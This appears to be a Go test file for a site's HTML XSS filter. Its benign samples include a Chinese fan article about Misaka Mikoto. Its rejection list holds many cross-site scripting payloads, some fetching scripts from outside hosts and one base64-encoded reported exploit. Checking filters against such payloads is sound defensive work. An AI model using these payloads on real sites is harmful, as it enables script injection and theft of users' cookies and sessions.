package service

import (
	"html"
	"testing"

	. "github.com/smartystreets/goconvey/convey"
)

func xssCheck(content string) (ok bool) {
	return html.UnescapeString(xssFilter(content)) == html.UnescapeString(content)
}

func TestXssCheck(t *testing.T) {
	Convey("valids", t, func() {
		items := []string{
			"<img src=\"//i0.hdslb.com/bfs/article/1d448e050cd09aca8d199cbc0900b3332360fa7f.jpg\" width=\"1274\" height=\"897\" data-size=\"208327\"/>",
			"<p><strong>“呐，你知道什么是超电磁炮吗？”</strong></p><p><br/></p><figure class=\"img-box\" contenteditable=\"false\"><img src=\"//i0.hdslb.com/bfs/article/4adb9255ada5b97061e610b682b8636764fe50ed.png\" class=\"cut-off-5\"/></figure><p><br/></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 2004年4月10日，镰池和马所著轻小说《魔法禁书目录》第一卷正式发行，随着一发“超电磁炮”飒爽登场，御坂美琴第一次向世界宣示了自己的存在。在当时谁也没有料到，这个总是被男主叫成“哔哩哔哩妹”的茶色头发女孩，将会成为日本动漫史上最具人气的现象级角色之一。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 今天是5月2日，御坂美琴迎来了她的第15个生日，<span style=\"text-decoration:line-through;\">现实年龄正式超过设定年龄（笑）</span>，作为一个萌新粉丝，看到身边仍然有相当多的前辈喜欢着美琴，不禁感叹姐姐大人的魅力果真是非同一般呐。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 大家是从什么时候喜欢上美琴的呢？</p><p>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;或许是被弹指发射硬币的英姿所震撼的时候，或许是被献身拯救妹妹的勇气所感动的时候，或许也是被傲娇脸孩子心的萌属性给圈粉……每个人心里的御坂美琴都不尽相同，但我们喜欢的都是同一个女孩，那个被我们亲切地称为“炮姐”的女孩子。</p><figure class=\"img-box\" contenteditable=\"false\"><img src=\"//i0.hdslb.com/bfs/article/1d448e050cd09aca8d199cbc0900b3332360fa7f.jpg\" width=\"1274\" height=\"897\" data-size=\"208327\"/><figcaption class=\"caption\" contenteditable=\"false\"></figcaption></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 这个女孩呐，有点小幼稚，但关键时刻却有着与超出年龄的成熟与可靠。她经常大大咧咧像个男孩，但内心深处却比谁都更加敏感细腻。她是很小的时候就愿意主动贡献DNA试图治疗病人的小天使，也是为拯救妹妹们不惜与整个学园都市为敌的姐姐大人。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 御坂美琴本可以做个没心没肺的大小姐。凭着仅有七人的level5之一的地位、靓丽的外貌、优渥的家境，她完全可以为所欲为。她的挚友佐天泪子在认识她之前也是这么想的:“这么优秀的学姐，性格肯定高傲又不讨喜吧？”但御坂美琴从来不认为自己有多特殊，她只是遵从内心理所当然的善意，做着每个温柔的人都会做的事。</p><figure class=\"img-box\" contenteditable=\"false\"><img src=\"//i0.hdslb.com/bfs/article/ff40ff7ed526171cfa6fd9a06b7b037707d96779.jpg\" width=\"702\" height=\"1248\" data-size=\"68550\"/><figcaption class=\"caption\" contenteditable=\"false\"></figcaption></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 因为理所当然的善意，她在了解到无能力者的痛苦之后，会发自内心地喊出满怀期待的鼓励；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 因为理所当然的善意，她在得知“绝对能力者进化计划”后，能毫不犹豫地挺身而出，无论自己与敌人相比是多么微不足道；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 因为理所当然的善意，她义无反顾地登上前往第三次世界大战战场的飞机，哪怕前方是未知祸福的道路；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 美琴她啊，不是什么高不可攀的女神，而是努力像你我一样平凡地生活着的小女孩。她只是遵从本心做自己认为正确的事，也恰好拥有能将那些天真愿望实现的力量，仅仅就是这样，一个并非伟大崇高而是理所当然的，仅此而已的故事。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所以才会有那刷了许多年都不曾消失的“你指尖跃动的电光”。像御坂美琴这样拥有力量却从不滥用，地位高高在上却从不端架子，见过世界的黑暗却仍相信光明的女孩，又怎能不让人喜欢呢？</p><p><br/></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 2004年，名为御坂美琴的女孩第一次与我们见面；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 2008年，《魔法禁书目录》动画化，那枚硬币第一次旋转着落在女孩的指尖；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 2009年，《某科学的超电磁炮》动画化，“only my railgun”的旋律点燃无数人的热血；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 2010年，mikufans改名为bilibili，这个以御坂美琴命名的小网站此时还名不见经传，几年后却已然成为二次元领域的庞然大物；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 2011年，御坂美琴当选世萌萌王，同时创下世萌迄今为止单次得票数量最多的记录；此后在各大萌战中所向披靡，截至目前俨然是获得萌王数量最多的角色；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ……</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 2017年，御坂美琴当选萌王之王；</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 2018年，炮姐的传说仍在继续。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 恕我擅自代表广大炮厨群体，在这里衷心地说上一句，当然是今天每一位炮厨都会说的话:</p><p>&nbsp; &nbsp; &nbsp; <strong>&nbsp; “美琴，生日快乐！”</strong></p><figure class=\"img-box\" contenteditable=\"false\"><img src=\"//i0.hdslb.com/bfs/article/c0b554fd8a6967973f45c72023833de435ba904f.jpg\" width=\"570\" height=\"797\" data-size=\"587725\"/><figcaption class=\"caption\" contenteditable=\"false\"></figcaption></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; 姐姐大人，你的过去我已来不及参与，但未来的故事，还请让我和你一起书写。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 这是关于某位向往平凡却注定不凡的女孩，和她的粉丝们，年复一年传递着爱与勇气的，充满希望的故事。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 我们的故事。</p><figure class=\"img-box\" contenteditable=\"false\"><img src=\"//i0.hdslb.com/bfs/article/4adb9255ada5b97061e610b682b8636764fe50ed.png\" class=\"cut-off-5\"/></figure><p><br/></p><p>附录:</p><p>御坂美琴应援群生日祝贺视频:</p><figure class=\"img-box\" contenteditable=\"false\"><img src=\"//i0.hdslb.com/bfs/article/e8f843e8b5f5e5ad8e15b0f5ffca8c239c1a57f7.png\" width=\"1320\" height=\"188\" data-size=\"40354\" aid=\"22658381\" class=\"video-card nomal\" type=\"nomal\"/></figure><p>B站点击量最高炮姐信仰视频:</p><figure contenteditable=\"false\" class=\"img-box\"><img src=\"//i0.hdslb.com/bfs/article/0d3ddf326ab6075607637d8b46e495e829225b3f.png\" width=\"1320\" height=\"188\" data-size=\"37606\" aid=\"810872\" class=\"video-card nomal\" type=\"nomal\"/></figure><p>up认识姐姐大人的过程（打广告？_(:3」∠)_）:</p><figure class=\"img-box\" contenteditable=\"false\"><img src=\"//i0.hdslb.com/bfs/article/8b5c8c4ac306259e0359e3e6744d515fe3c346c8.png\" width=\"1320\" height=\"224\" data-size=\"24204\" aid=\"118943\" class=\"article-card\" type=\"normal\"/></figure><p><br/></p>",
			"<a href=\"http://space.bilibili.com/11052822\">文/终路之零</a>",
			"<p>&quot;</p>",
		}
		for _, con := range items {
			So(xssCheck(con), ShouldBeTrue)
		}
	})
	Convey("invalids", t, func() {
		items := []string{
			`<a onblur="alert(secret)" href="http://www.google.com">Google</a>`,
			`';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
			`'';!--"<XSS>=&{()}`,
			`0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"`,
			`<script/src=data:,alert()>`,
			`<marquee/onstart=alert()>`,
			`<video/poster/onerror=alert()>`,
			`<isindex/autofocus/onfocus=alert()>`,
			`<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>`,
			`<IMG SRC="javascript:alert('XSS');">`,
			`<IMG SRC=javascript:alert('XSS')>`,
			`<IMG SRC=JaVaScRiPt:alert('XSS')>`,
			`<IMG SRC=javascript:alert("XSS")>`,
			"<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
			`<a onmouseover="alert(document.cookie)">xxs link</a>`,
			`<a onmouseover=alert(document.cookie)>xxs link</a>`,
			`<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
			`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
			`<IMG SRC=# onmouseover="alert('xxs')">`,
			`<IMG SRC= onmouseover="alert('xxs')">`,
			`<IMG onmouseover="alert('xxs')">`,
			`<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
			`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;`,
			`<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&`,
			`<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
			`<IMG SRC="jav	ascript:alert('XSS');">`,
			`<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
			`<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
			`<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
			`<IMG SRC=" &#14;  javascript:alert('XSS');">`,
			`<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			"<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
			`<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			`<<SCRIPT>alert("XSS");//<</SCRIPT>`,
			`<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >`,
			`<SCRIPT SRC=//ha.ckers.org/.j>`,
			`<IMG SRC="javascript:alert('XSS')"`,
			`<iframe src=http://ha.ckers.org/scriptlet.html <`,
			`</script><script>alert('XSS');</script>`,
			`</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
			`<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
			`<BODY BACKGROUND="javascript:alert('XSS')">`,
			`<IMG DYNSRC="javascript:alert('XSS')">`,
			`<IMG LOWSRC="javascript:alert('XSS')">`,
			`<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
			`<IMG SRC='vbscript:msgbox("XSS")'>`,
			`<IMG SRC="livescript:[code]">`,
			`<BODY ONLOAD=alert('XSS')>`,
			`<BGSOUND SRC="javascript:alert('XSS');">`,
			`<BR SIZE="&{alert('XSS')}">`,
			`<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
			`<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">`,
			`<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>`,
			`<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">`,
			`<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>`,
			`<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`,
			`<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
			`exp/*<A STYLE='no\xss:noxss("*//*");`,
			`<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
			`<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
			`<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
			`<XSS STYLE="xss:expression(alert('XSS'))">`,
			`<XSS STYLE="behavior: url(xss.htc);">`,
			`<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
			`<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
			`<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
			`<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
			`<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
			`<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
			`<TABLE BACKGROUND="javascript:alert('XSS')">`,
			`<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
			`<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
			`<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`,
			`<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`,
			`<DIV STYLE="width: expression(alert('XSS'));">`,
			`<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->`,
			`<BASE HREF="javascript:alert('XSS');//">`,
			`<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>`,
			`<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->`,
			`<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>`,
			`<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`,
			`<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`,
			`<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`,
			`<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			`<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			`<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			`<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			"<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
			`<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			`<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			`<A HREF="http://66.102.7.147/">XSS</A>`,
			`0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"`,
			`veris-->group<svg/onload=alert(/XSS/)//`,
			`#"><img src=M onerror=alert('XSS');>`,
			`element[attribute='<img src=x onerror=alert('XSS');>`,
			`<w contenteditable id=x onfocus=alert()>`,
			`<svg/onload=%26%23097lert%26lpar;1337)>`,
			`<script>for((i)in(self))eval(i)(1)</script>`,
			`<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>`,
			`<sCR<script>iPt>alert(1)</SCr</script>IPt>`,
			`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>`,
			// 上报的xss利用代码
			`<svg/onload=$.globalEval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZW1tbW1tLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=',/*''*/)) style=\"display:none\">`,
		}
		for _, con := range items {
			So(xssCheck(con), ShouldBeFalse)
		}
	})
}
